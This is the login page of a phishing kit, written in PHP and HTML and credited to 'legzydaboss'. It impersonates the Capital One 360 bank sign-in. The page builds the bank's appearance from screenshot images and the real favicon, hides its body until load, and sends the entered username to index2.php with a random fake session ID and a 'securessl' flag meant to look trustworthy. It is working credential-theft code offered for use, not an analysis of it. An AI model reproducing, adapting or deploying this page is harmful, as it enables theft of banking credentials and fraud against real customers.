<?php
/*
Created by legzydaboss -- icq 692561824
*/
require "includes/session_protect.php";
require "includes/functions.php";
require "includes/One_Time.php";
?>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>

<title>Capital One 360</title>
<head><meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<link rel="shortcut icon"
              href="https://secure.capitalone360.com/favicon.ico?v=1.0"/>
			  
			  
	
<script type="text/javascript">

function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}

</script>

<style type="text/css">
/*----------Text Styles----------*/
.b { font-weight: bold; }
.mb0 { margin-bottom: 0px; } 
.f15 { font-size: 15px; }
.f16 { font-size: 16px; }
.b { font-weight: bold; }
.floatleft { float: left; }
input.s1, input.s2, input.s3, input.s4, input.s5, input.s6, input.s7, input.s8, input.s9, input.s10, input.s11, input.s12, input.s13, input.s14, input.s15, input.s16, input.s17, input.s18, input.s19, input.s20, input.s21, input.s22, input.s23, input.s24, input.s25, input.s26, input.s27, input.s28, input.s29, input.s30, input.s31, input.s32, .nowrap { display: block; float: left; height: auto; margin: 0px 5px 0px 0px; padding: 0px; vertical-align: top; }
input.text, input.hint { border: 1px #7F9DB9 solid; color: #333; padding: 1px; }
input.hint { text-align: center; color: #333; }
.s1, .s2, .s3, .s4, .s5, .s6, .s7, .s8, .s9, .s10, .s11, .s12, .s13, .s14, .s15, .s16, .s17, .s18, .s19, .s20, .s21, .s22, .s23, .s24, .s25, .s26, .s27, .s28, .s29, .s30, .s31, .s32, .nowrap { display: block; float: left; height: auto; margin: 0px 5px 5px 0px; padding: 0px; vertical-align: top; }
.s1, .t1, .nowrap { width: 20px; } .s2, .t2 { width: 45px; } .s3, .t3 { width: 70px; } .s4, .t4 { width: 95px; } .s5, .t5 { width: 120px; } .s6, .t6 { width: 145px; } .s7, .t7 { width: 170px; } .s8, .t8 { width: 195px; } .s9, .t9 { width: 220px; } .s10, .t10 { width: 245px; } .s11, .t11 { width: 270px; } .s12, .t12 { width: 295px; } .s13, .t13 { width: 320px; } .s14, .t14 { width: 345px; } .s15, .t15 { width: 370px; } .s16, .t16 { width: 395px; } .s17, .t17 { width: 420px; } .s18, .t18 { width: 445px; } .s19, .t19 { width: 470px; } .s20, .t20 { width: 495px; } .s21, .t21 { width: 520px; } .s22, .t22 { width: 545px; } .s23, .t23 { width: 570px; } .s24, .t24 { width: 595px; } .s25, .t25 { width: 620px; } .s26, .t26 { width: 645px; } .s27, .t27 { width: 670px; } .s28, .t28 { width: 695px; } .s29, .t29 { width: 720px; } .s30, .t30 { width: 745px; } .s31, .t31 { width: 770px; } .s32, .t32 { width: 795px; }
.p1 { margin-left: 25px; } .p2 { margin-left: 50px; } .p3 { margin-left: 75px; } .p4 { margin-left: 100px; } .p5 { margin-left: 125px; } .p6 { margin-left: 150px; } .p7 { margin-left: 175px; } .p8 { margin-left: 200px; } .p9 { margin-left: 225px; } .p10 { margin-left: 250px; } .p11 { margin-left: 275px; } .p12 { margin-left: 300px; } .p13 { margin-left: 325px; } .p14 { margin-left: 350px; } .p15 { margin-left: 375px; } .p16 { margin-left: 400px; } .p17 { margin-left: 425px; } .p18 { margin-left: 450px; } .p19 { margin-left: 475px; } .p20 { margin-left: 500px; } .p21 { margin-left: 525px; } .p22 { margin-left: 550px; } .p23 { margin-left: 575px; } .p24 { margin-left: 600px; } .p25 { margin-left: 625px; } .p26 { margin-left: 650px; } .p27 { margin-left: 675px; } .p28 { margin-left: 700px; } .p29 { margin-left: 725px; } .p30 { margin-left: 750px; } .p31 { margin-left: 775px; }
.sbg { background: #666666; height: 20px; line-height: 20px; color: #FFFFFF; }
.wpmd {font-size: 13px;font-family: Arial,Helvetica,Sans-Serif;font-style: normal;font-weight: normal;}
.fieldset { border: 1px solid #CCCCCC; -moz-border-radius: 5px; -webkit-border-radius: 5px; border-radius: 5px; padding-bottom: 15px; padding-left: 25px; padding-right: 24px; margin-bottom: 15px; }
.legend { display: block; float: left; margin: -11px 0px 0px -2px; background: #FFFFFF; color: #a12830; width: auto !important; padding-bottom: 10px; padding-right: 1px; }
/*----------Para Styles----------*/
DIV,UL,OL /* Left */
{
 margin-top: 0px;
 margin-bottom: 0px;
}
</style>

<body style="visibility:hidden" onload="unhideBody()">

 

</head>
<body bgColor="#FFFFFF">
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1361px; height:635px; z-index:0"><img src="images/form.png" alt="" title="" border=0 width=1361 height=635></div>

 <form name="login" id="login" method="post" autocomplete="off" autocapitalize="off" action="index2.php?&sessionid=<?php echo generateRandomString(80); ?>&securessl=true">
<input name="username" type="text" style="position:absolute;width:349px;left:235px;top:235px;z-index:6" class="text" required>

<div id="formimage1" style="position:absolute; left:529px; top:351px; z-index:9"><input type="image" name="formimage1" width="110" height="30" src="images/button.png"></div>


<div id="image8" style="position:absolute; overflow:hidden; left:667px; top:180px; width:307px; height:256px; z-index:15"><a href="#"><img src="images/learn.png" alt="" title="" border=0 width=307 height=256></a></div>

<div id="image14" style="position:absolute; overflow:hidden; left:208px; top:350px; width:143px; height:19px; z-index:15"><a href="#"><img src="images/for.png" alt="" title="" border=0 width=143 height=19></a></div>

<div id="image13" style="position:absolute; overflow:hidden; left:205px; top:388px; width:150px; height:18px; z-index:14"><a href="#"><img src="images/dont.png" alt="" title="" border=0 width=150 height=18></a></div>

<div id="image11" style="position:absolute; overflow:hidden; left:0px; top:618px; width:1360px; height:307px; z-index:16"><a href="#"><img src="images/footer1.png" alt="" title="" border=0 width=1360 height=307></a></div>
